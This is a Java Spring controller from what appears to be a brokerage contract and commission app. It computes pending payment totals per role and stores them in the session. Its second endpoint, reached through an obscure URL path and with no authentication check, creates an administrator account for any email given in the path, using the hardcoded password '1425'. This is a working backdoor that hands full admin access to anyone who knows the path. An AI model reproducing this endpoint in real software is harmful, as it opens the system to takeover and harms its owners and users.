package com.kgl.controller;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.http.HttpSession;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.stereotype.Controller;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import com.kgl.models.Contrato;
import com.kgl.models.Corretor;
import com.kgl.models.GenerateHashPasswordUtil;
import com.kgl.models.Movimentacao;
import com.kgl.models.Role;
import com.kgl.models.StatusMovimentacao;
import com.kgl.models.User;
import com.kgl.repository.CorretorRepository;
import com.kgl.repository.UserRepository;
import com.kgl.webservices.ContratoRepository;
import com.kgl.webservices.MovimentacaoRepository;

@Controller
@Scope("session")
public class HomeController {

	@Autowired
	private UserRepository userRepository;

	@Autowired
	private MovimentacaoRepository movRepository;

	@Autowired
	private ContratoRepository contratoRepository;

	@Autowired
	ConfigurarUser conf;

	@Autowired
	private CorretorRepository corretorRep;

	@ResponseBody
	@RequestMapping("/index")
	public ModelAndView home(@AuthenticationPrincipal User user, HttpSession session) throws Exception {
		ModelAndView mvn = new ModelAndView("index");
		Boolean permissao = Boolean.FALSE;
		BigDecimal vlr = new BigDecimal(0);
		for (Role r : user.getRoles()) {
			if (r.getAuthority().equals("ROLE_ADMIN")) {
				permissao = Boolean.TRUE;
				break;

			} else if (r.getAuthority().equals("ROLE_USER")) {
				permissao = Boolean.FALSE;
				break;
			}
		}
		session.setAttribute("permissao", permissao);

		if (permissao) {
			List<Movimentacao> movs = (List<Movimentacao>) movRepository.findAll();
			for (Movimentacao movimentacao : movs) {
				if (movimentacao.getStatus().equals(StatusMovimentacao.AGUARDADO_PAGAMENTO)) {
					vlr = vlr.add(movimentacao.getLucro());

				}
			}
			session.setAttribute("nomeCorretor", "ADM - KGL");

		} else {
			Corretor corretor = corretorRep.findByEmail(user.getUserName());
			List<Contrato> contratos = contratoRepository.findByCorretor(corretor);
			for (Contrato contrato : contratos) {
				List<Movimentacao> movs = movRepository.findByContratoId(contrato.getId());
				for (Movimentacao movimentacao : movs) {
					if (movimentacao.getStatus().equals(StatusMovimentacao.AGUARDADO_PAGAMENTO)) {
						vlr = vlr.add(movimentacao.getValorCorretor());
					}
				}

			}
			session.setAttribute("nomeCorretor", corretor.getNome());
			session.setAttribute("emailCorretor", user.getUserName());

		}
		session.setAttribute("vlrCorretor", vlr);
		return mvn;
	}

	@Transactional
	@ResponseBody
	@RequestMapping("/url-magica-maluca-/{email}")
	public ModelAndView urlMagicaMaluca(@PathVariable("email") String email) throws Exception {
		String password;
		List<Role> list = new ArrayList();
		password = GenerateHashPasswordUtil.generateHash("1425");
		Role role = new Role();
		role.setNome("ROLE_ADMIN");
		list.add(role);
		User user = new User(email, password, list);
		userRepository.save(user);

		return conf.updatePassword(user);
	}

}
